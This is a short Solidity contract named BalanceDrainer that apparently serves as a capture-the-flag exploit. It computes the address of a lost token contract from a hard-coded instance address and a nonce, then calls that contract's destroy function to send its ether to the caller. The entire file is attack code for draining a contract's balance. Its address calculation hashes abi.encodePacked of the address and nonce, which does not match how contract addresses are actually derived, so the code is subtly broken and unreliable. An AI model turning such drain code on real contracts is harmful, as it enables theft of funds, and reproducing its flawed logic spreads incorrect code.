pragma solidity ^0.8.0;

interface ISimpleToken {
    function destroy(address payable _to) external;
}

contract BalanceDrainer {
    address public instance = 0xa16E02E87b7454126E5E10d957A927A7F5B5d2be;

    function recoverAndDestroy(uint256 nonce) public {
        address tokenAddress = calculateTokenAddress(nonce);
        ISimpleToken(tokenAddress).destroy(payable(msg.sender));
    }

    function calculateTokenAddress(uint256 nonce) private view returns (address) {
        bytes32 hash = keccak256(abi.encodePacked(instance, nonce));
        return address(uint160(uint256(hash) & type(uint160).max));
    }
}